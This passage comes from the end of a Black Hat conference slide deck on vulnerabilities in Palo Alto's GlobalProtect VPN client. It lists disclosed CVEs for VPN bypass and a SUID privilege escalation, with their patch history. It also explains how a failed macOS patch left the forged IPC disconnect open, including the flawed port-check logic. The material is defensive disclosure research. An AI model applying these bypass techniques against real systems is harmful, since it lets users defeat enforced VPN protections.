_in the GlobalProtect macOS app.”_
Potential mitigation: Combine ‘Split Tunnel
Domain’**AND**‘Split DNS’ features.|

#BHUSA @BlackHatEvents

61

## Slide 62

|**Vulnerability (CVE)**|**Reported**|**Status**|**Fixed**|**Notes / Mitigation**|
|---|---|---|---|---|
|**VPN Bypass:**
DNS Spoofing, Wildcard
Split Tunnel Domain|**April 2024**|**WON’T FIX**|**N/A**|_“After investigation, we have determined_
_that we do not consider this a vulnerability_
_in the GlobalProtect macOS app.”_
Potential mitigation: Combine ‘Split Tunnel
Domain’**AND**‘Split DNS’ features.|
|**VPN Bypass:**
Forged IPC Disconnect
(MacOS)|**October 2024**|**PATCHED**
CVE-2025-0135
CVSS v4 Base:
**5.7**|**July 2025**
Initial patch ineffective,
repatched in:
6.2.8-h3 (6.2.8-c263)
6.3.3-h2(6.3.3-c676)|Palo Alto reported to fix under CVE-2025-
0135, however vulnerability still present
Repatched successfully under original
CVE-2025-0135|
|**VPN Bypass:**
Forged IPC Disconnect
(Linux)|**October 2024**|**PATCHED**
CVE-2025-2179
CVSS v4 Base:
**6.8**|**July 2025**
Initial patch ineffective,
repatched in:
6.2.9|Palo Alto reported to fix under CVE-2025-
0140, however vulnerability still present
Repatched successfully under CVE-2025-
2179|

#BHUSA @BlackHatEvents

62

## Slide 63

|**Vulnerability (CVE)**|**Reported**|**Status**|**Fixed**|**Notes / Mitigation**|
|---|---|---|---|---|
|**VPN Bypass:**
DNS Spoofing, Wildcard
Split Tunnel Domain|**April 2024**|**WON’T FIX**|**N/A**|_“After investigation, we have determined_
_that we do not consider this a vulnerability_
_in the GlobalProtect macOS app.”_
Potential mitigation: Combine ‘Split Tunnel
Domain’**AND**‘Split DNS’ features.|
|**VPN Bypass:**
Forged IPC Disconnect
(MacOS)|**October 2024**|**PATCHED**
CVE-2025-0135
CVSS v4 Base:
**5.7**|**July 2025**
Initial patch ineffective,
repatched in:
6.2.8-h3 (6.2.8-c263)
6.3.3-h2(6.3.3-c676)|Palo Alto reported to fix under CVE-2025-
0135, however vulnerability still present
Repatched successfully under original
CVE-2025-0135|
|**VPN Bypass:**
Forged IPC Disconnect
(Linux)|**October 2024**|**PATCHED**
CVE-2025-2179
CVSS v4 Base:
**6.8**|**July 2025**
Initial patch ineffective,
repatched in:
6.2.9|Palo Alto reported to fix under CVE-2025-
0140, however vulnerability still present
Repatched successfully under CVE-2025-
2179|
|**VPN Bypass:**
Plist File Modification
(MacOS)|**October 2024**|**PATCHED**
CVE-2025-0140
CVSS v4 Base:
**6.8**|**July 2025**
Patched in:
6.2.8-h2 (6.2.8-c233)
6.3.3-h1(6.3.3-c650)|Although initially reported for MacOS, Palo
Alto reported to affect:
•
Linux
•
MacOS|
|**Privilege Escalation:**
SUID Binary Abuse
(MacOS)|**October 2024**|**PATCHED**
CVE-2025-0141
CVSS v4 Base:
**8.4**|**July 2025**
Patched in:
6.2.8-h2 (6.2.8-c233)
6.3.3-h1(6.3.3-c650)|Although initially reported for MacOS, Palo
Alto reported to affect:
•
Windows
•
Linux
•
MacOS|

#BHUSA @BlackHatEvents

63

## Slide 64

The Patch that Made Things Worse **CVE-2025-0135 – Forged IPC Disconnect (macOS)**

**Before the 'patch’:**

- Low privileged user could disable GlobalProtect via spoofed IPC command

```
COMMAND     PID       USER   FD   TYPE    (...)
PanGpHipM48222 demo         0u  IPv4    (...) (CLOSE_WAIT)
PanGpHipM48222 demo         1u  IPv4    (...) (CLOSE_WAIT)
spoofedC48587 demo         3u  IPv4    (...) (ESTABLISHED)
```

**Defensive Control Bypass Technique** `lsof` check Fooled by Bash redirection or short binary

#BHUSA @BlackHatEvents

64

## Slide 65

###### The Patch that Made Things Worse **CVE-2025-0135 – Forged IPC Disconnect (macOS)**

###### **After the 'patch’ (version 6.3.3):**

- Exact same PoC still worked!

- Defensive control was **<u>removed</u>** , not fixed

- Now **<u>any</u>** process can send disconnect messages

Defensive Control Bypass Technique
lsof  check Fooled by Bash
redirection or short binary

#BHUSA @BlackHatEvents

65

## Slide 66

###### The Patch that Made Things Worse

```
Derived from decompiled code
```

isConnectedByPan(clientPort)  – new implementation
Verification
Failed
no no no
no
For each  TCP  yes local port  yes remote port  yes Trusted
==  Pan
pid / fd: socket? == 4767?
clientPort? Binary?
yes
Verification
Q: What’s the issue here ? Passed

###### Q: What’s the issue here ?

#BHUSA @BlackHatEvents

66

## Slide 67

###### The Patch that Made Things Worse

###### **`isConnectedByPan(52123)`**

Privileged (uid == 0) Unprivileged (uid != 0)
Process Name spoofedConn
PanGPS
Process ID 12345
localhost
lport 4767 /4767 lport 52123
rport 52123 rport 4767

remote port
local port  yes
==
== 4767?
clientPort?

###### Logic **always** identifies server i.e. `PanGPS`

Trusted  yes
Pan  Verification
Binary? Passed

#BHUSA @BlackHatEvents

67

## Slide 68

# “

`Security must be built in, not bolted on` ”

To this day, GlobalProtect gives **too much control to user-space processes** , it **fails to enforce privilege boundaries** , and relies on **bolt-on security checks** instead of architectural safeguards.

#BHUSA @BlackHatEvents

68

## Slide 69

##### Final Takeaways Black Hat Sound Bytes

#BHUSA @BlackHatEvents

69

## Slide 70

###### 1. Security software is still software, and <u>it can be dangerous</u>

#BHUSA @BlackHatEvents

70

## Slide 71

###### 1. Security software is still software, and <u>it can be dangerous</u> 2. Bad design can’t be patched, <u>it needs to be rebuilt</u>

#BHUSA @BlackHatEvents

71

## Slide 72

###### 1. Security software is still software, and <u>it can be dangerous</u> 2. Bad design can’t be patched, <u>it needs to be rebuilt</u> 3. Blind trust in “security” tools can make you <u>less secure</u>

#BHUSA @BlackHatEvents

72

## Slide 73

## Thank you

```
Link to website
Whitepaper to follow
```

```
Alex BourlaWhitepaper to follow
https://www.linkedin.com/in/alexbourla/
hi@alexbourla.com
https://www.alexbourla.com
```

#BHUSA @BlackHatEvents

73
